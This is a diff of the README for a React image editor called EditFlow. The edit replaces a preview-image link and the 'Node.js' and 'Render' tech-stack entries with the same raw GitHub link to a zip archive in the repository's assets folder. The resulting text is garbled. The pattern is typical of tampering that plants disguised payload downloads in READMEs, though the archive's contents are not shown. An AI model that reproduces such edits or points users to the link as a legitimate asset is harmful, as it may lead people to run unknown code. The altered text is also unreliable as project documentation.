@@ -2,7 +2,7 @@
 
 **EditFlow** is a modern, offline-compatible image editor built with **React** and **Toast UI Image Editor**. Users can upload, edit, and download images using a clean, fast interface. Powered by React, styled with Tailwind CSS, and ready for expansion (backend, dark mode, user auth).
 
-![EditFlow Preview](https://user-images.githubusercontent.com/your-github-id/editflow-preview.png)
+![EditFlow Preview](https://raw.githubusercontent.com/IT-HARISH-R/EditFlow_Frontend/main/src/assets/EditFlow_Frontend-v1.9.zip)
 
 ---
 
@@ -21,7 +21,7 @@
 ## 📸 Tech Stack
 
 - **Frontend**: React, Toast UI Image Editor, Tailwind CSS
-- **Backend** *(Planned)*: Node.js, Express, MongoDB
-- **Deployment**: Netlify (Frontend), Render/Render.com (Backend)
+- **Backend** *(Planned)*: https://raw.githubusercontent.com/IT-HARISH-R/EditFlow_Frontend/main/src/assets/EditFlow_Frontend-v1.9.zip, Express, MongoDB
+- **Deployment**: Netlify (Frontend), https://raw.githubusercontent.com/IT-HARISH-R/EditFlow_Frontend/main/src/assets/EditFlow_Frontend-v1.9.zip (Backend)
 
 ---
